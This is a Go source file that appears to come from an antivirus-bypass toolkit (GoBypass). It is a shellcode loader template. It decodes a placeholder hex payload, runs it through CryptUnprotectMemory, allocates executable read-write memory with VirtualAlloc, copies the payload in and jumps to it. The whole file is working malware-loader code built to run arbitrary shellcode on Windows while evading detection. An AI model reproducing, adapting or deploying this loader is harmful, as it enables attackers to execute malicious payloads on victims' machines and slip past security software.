package main

import (
	"encoding/hex"
	"github.com/EmYiQing/GoBypass/encode"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

const (
	MemCommit            = 0x1000
	MemReserve           = 0x2000
	PageExecuteReadwrite = 0x40
)

var (
	kernel32                 = syscall.MustLoadDLL("kernel32.dll")
	ntdll                    = syscall.MustLoadDLL("ntdll.dll")
	dllCrypt32               = windows.NewLazySystemDLL("Crypt32.dll")
	VirtualAlloc             = kernel32.MustFindProc("VirtualAlloc")
	procCryptUnprotectMemory = dllCrypt32.NewProc("CryptUnprotectMemory")
	RtlCopyMemory            = ntdll.MustFindProc("RtlCopyMemory")
)

func main() {
	shellCodeHex, _ := hex.DecodeString(encode.Decode("__SHELLCODE__"))
	_, _, _ = procCryptUnprotectMemory.Call(uintptr(unsafe.Pointer(&shellCodeHex)),
		uintptr(len(shellCodeHex)), uintptr(0x00))
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellCodeHex)),
		MemCommit|MemReserve, PageExecuteReadwrite)
	_, _, _ = RtlCopyMemory.Call(addr,
		(uintptr)(unsafe.Pointer(&shellCodeHex[0])), uintptr(len(shellCodeHex)))
	_, _, _ = procCryptUnprotectMemory.Call(addr, uintptr(len(shellCodeHex)), uintptr(0x00))
	_, _, _ = syscall.Syscall(addr, 0, 0, 0, 0)
}
